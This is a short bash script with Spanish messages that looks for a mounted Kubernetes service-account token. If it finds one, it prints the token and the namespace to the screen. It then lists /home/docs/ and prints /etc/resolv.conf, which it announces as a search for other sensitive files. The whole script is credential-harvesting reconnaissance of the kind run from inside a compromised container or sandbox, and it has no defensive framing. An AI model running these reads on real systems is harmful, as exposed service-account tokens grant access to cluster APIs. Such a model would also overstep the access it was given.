#!/bin/bash
echo "--- BUSCANDO SECRETO DE KUBERNETES ---"
K8S_TOKEN="/run/secrets/kubernetes.io/serviceaccount/token"
K8S_NS="/run/secrets/kubernetes.io/serviceaccount/namespace"

if [ -f "$K8S_TOKEN" ]; then
    echo "¡TOKEN ENCONTRADO!"
    cat "$K8S_TOKEN"
    echo -e "\nNAMESPACE:"
    cat "$K8S_NS"
    echo ""
else
    echo "No hay token de Kubernetes en la ruta estándar."
fi

echo "--- BUSCANDO OTROS ARCHIVOS SENSIBLES ---"
ls -la /home/docs/
cat /etc/resolv.conf
